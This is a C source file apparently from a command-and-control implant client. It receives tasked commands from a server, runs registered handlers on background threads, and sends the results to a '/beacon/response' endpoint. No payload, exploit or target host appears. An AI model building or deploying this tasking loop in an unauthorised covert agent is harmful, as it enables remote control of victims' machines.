/**
 * @file async_commands.c
 * @brief Implementation of asynchronous command execution
 */
#include "../../include/commands/async_commands.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "../../include/client.h"
#include "../../include/command_queue.h"
#include "../../include/protocol.h"
#include "command_registry.h"  // Local include for command registry

// Only define DEBUG_LOG if not already defined
#ifndef DEBUG_LOG
#ifdef DEBUG
#define DEBUG_LOG(...)            \
  do {                            \
    fprintf(stderr, "[DEBUG] ");  \
    fprintf(stderr, __VA_ARGS__); \
    fprintf(stderr, "\n");        \
  } while (0)
#else
#define DEBUG_LOG(...) ((void)0)
#endif
#endif

/**
 * @brief Thread function that executes a command
 * @param arg Thread context (CommandThreadContext*)
 * @return NULL
 */
static void* command_thread_runner(void* arg) {
  CommandThreadContext* ctx = (CommandThreadContext*)arg;
  if (!ctx) {
    DEBUG_LOG("Invalid thread context");
    return NULL;
  }

  DEBUG_LOG("Starting command thread for %s (ID: %s)", ctx->command_name,
            ctx->command_id);

  // Update command state to running
  update_command_state(ctx->queue, ctx->command_id, COMMAND_RUNNING);

  char* result = NULL;

  // Execute command with or without args
  if (ctx->handler) {
    result = ctx->handler(ctx->darwin);
  } else if (ctx->handler_with_args && ctx->args) {
    result = ctx->handler_with_args(ctx->darwin, ctx->args);
  } else {
    DEBUG_LOG("No valid handler found for command %s", ctx->command_name);
    store_command_result(ctx->queue, ctx->command_id,
                         "Error: No handler for command");
    free(ctx);
    return NULL;
  }

  // Store command result
  if (result) {
    DEBUG_LOG("Command %s completed with result: %s", ctx->command_name,
              result);
    store_command_result(ctx->queue, ctx->command_id, result);
    free(result);
  } else {
    DEBUG_LOG("Command %s failed or returned NULL", ctx->command_name);
    update_command_state(ctx->queue, ctx->command_id, COMMAND_FAILED);
  }

  // Free args if we had them
  if (ctx->args) {
    free(ctx->args);
  }

  // Free thread context
  free(ctx);
  return NULL;
}

/**
 * @brief Initialize asynchronous command system
 * @return true if successful, false otherwise
 */
bool initialize_async_commands(void) {
  // Nothing to initialize for now
  return true;
}

/**
 * @brief Execute a command asynchronously
 * @param ctx Client context
 * @param command_id Command ID
 * @param command Command name
 * @return true if the command was started, false otherwise
 */
bool execute_command_async(ClientContext* ctx, const char* command_id,
                           const char* command) {
  if (!ctx || !command_id || !command) {
    DEBUG_LOG("Invalid parameters to execute_command_async");
    return false;
  }

  DEBUG_LOG("Executing command %s asynchronously (ID: %s)", command,
            command_id);

  // Check for command arguments (format: command_name:args)
  const char* args_sep = strchr(command, ':');
  char* command_name = NULL;
  char* args = NULL;

  if (args_sep) {
    // Make a copy of the command name (up to the separator)
    size_t name_len = args_sep - command;
    command_name = (char*)malloc(name_len + 1);
    if (!command_name) {
      DEBUG_LOG("Failed to allocate memory for command name");
      return false;
    }

    strncpy(command_name, command, name_len);
    command_name[name_len] = '\0';

    // Create a copy of the arguments
    args = strdup(args_sep + 1);
    if (!args) {
      DEBUG_LOG("Failed to allocate memory for command arguments");
      free(command_name);
      return false;
    }
  } else {
    // Just use the command directly
    command_name = strdup(command);
    if (!command_name) {
      DEBUG_LOG("Failed to allocate memory for command name");
      return false;
    }
  }

  // Get command handler
  command_handler_t handler = get_command_handler(command_name);
  command_handler_with_args_t handler_with_args = NULL;

  // If no simple handler found, try with args handler
  if (!handler) {
    handler_with_args = get_command_handler_with_args(command_name);
    if (!handler_with_args) {
      DEBUG_LOG("No handler found for command %s", command_name);
      free(command_name);
      if (args)
        free(args);
      return false;
    }

    // Need args for this handler type
    if (!args) {
      DEBUG_LOG("Command %s requires arguments but none provided",
                command_name);
      free(command_name);
      return false;
    }
  }

  // Add to command queue
  if (!add_command_to_queue(ctx->command_queue, command_id, command_name)) {
    DEBUG_LOG("Failed to add command to queue");
    free(command_name);
    if (args)
      free(args);
    return false;
  }

  // Create thread context
  CommandThreadContext* thread_ctx =
      (CommandThreadContext*)malloc(sizeof(CommandThreadContext));
  if (!thread_ctx) {
    DEBUG_LOG("Failed to allocate thread context");
    remove_command(ctx->command_queue, command_id);
    free(command_name);
    if (args)
      free(args);
    return false;
  }

  // Initialize thread context
  thread_ctx->darwin = &ctx->darwin;
  thread_ctx->handler = handler;
  thread_ctx->handler_with_args = handler_with_args;
  strncpy(thread_ctx->command_id, command_id,
          sizeof(thread_ctx->command_id) - 1);
  thread_ctx->command_id[sizeof(thread_ctx->command_id) - 1] = '\0';
  strncpy(thread_ctx->command_name, command_name,
          sizeof(thread_ctx->command_name) - 1);
  thread_ctx->command_name[sizeof(thread_ctx->command_name) - 1] = '\0';
  thread_ctx->args = args;  // Transfer ownership of args
  thread_ctx->queue = ctx->command_queue;

  // Start thread
  pthread_t thread;
  if (pthread_create(&thread, NULL, command_thread_runner, thread_ctx) != 0) {
    DEBUG_LOG("Failed to create command thread");
    remove_command(ctx->command_queue, command_id);
    free(thread_ctx);
    free(command_name);
    if (args)
      free(args);
    return false;
  }

  // Set thread to detached mode
  pthread_detach(thread);

  // Remember the thread ID in the queue entry
  pthread_mutex_lock(&ctx->command_queue->lock);
  for (size_t i = 0; i < ctx->command_queue->count; i++) {
    if (strcmp(ctx->command_queue->entries[i].id, command_id) == 0) {
      ctx->command_queue->entries[i].thread = thread;
      break;
    }
  }
  pthread_mutex_unlock(&ctx->command_queue->lock);

  free(command_name);  // Don't need this anymore
  return true;
}

/**
 * @brief Process completed commands and send results
 * @param ctx Client context
 * @return true if successful, false otherwise
 */
bool process_completed_commands(ClientContext* ctx) {
  if (!ctx || !ctx->command_queue) {
    return false;
  }

  CommandEntry* completed = get_completed_commands(ctx->command_queue);
  if (!completed) {
    // No completed commands
    return true;
  }

  bool success = true;

  // Process each completed command
  for (size_t i = 0; completed[i].id[0] != '\0'; i++) {
    DEBUG_LOG("Processing completed command: %s (ID: %s)", completed[i].name,
              completed[i].id);

    // Create response using our protocol
    ProtocolBuilder* builder = protocol_create_command_response(
        completed[i].id, completed[i].result
                             ? completed[i].result
                             : "Command completed with no result");

    if (builder) {
      // Send response back to server
      char response_url[256];
      snprintf(response_url, sizeof(response_url), "/beacon/response/%s/%s",
               ctx->config.client_id, completed[i].id);

      http_request_t resp_req = {.url_path = response_url,
                                 .body = protocol_get_message(builder),
                                 .body_length = protocol_get_length(builder)};

      http_response_t resp_resp = {0};
      if (send_http_request(ctx, &resp_req, &resp_resp) == NETWORK_SUCCESS) {
        DEBUG_LOG("Command response sent successfully");

        // Now we can remove the command from the queue
        remove_command(ctx->command_queue, completed[i].id);
      } else {
        DEBUG_LOG("Failed to send command response");
        success = false;
        // Leave in queue for retry
      }

      protocol_builder_destroy(builder);
      free_http_response(&resp_resp);
    } else {
      DEBUG_LOG("Failed to create response protocol message");
      success = false;
    }
  }

  // Free the completed commands array
  for (size_t i = 0; completed[i].id[0] != '\0'; i++) {
    if (completed[i].result) {
      free(completed[i].result);
    }
  }
  free(completed);

  return success;
}

/**
 * @brief Stop all running commands
 * @param ctx Client context
 */
void stop_all_commands(ClientContext* ctx) {
  if (!ctx || !ctx->command_queue) {
    return;
  }

  pthread_mutex_lock(&ctx->command_queue->lock);

  for (size_t i = 0; i < ctx->command_queue->count; i++) {
    if (ctx->command_queue->entries[i].state == COMMAND_RUNNING) {
      // In a real implementation, you might want to send a signal to the thread
      // For now, we'll just mark it as failed
      ctx->command_queue->entries[i].state = COMMAND_FAILED;
      DEBUG_LOG("Marked running command %s as failed",
                ctx->command_queue->entries[i].name);
    }
  }

  pthread_mutex_unlock(&ctx->command_queue->lock);
}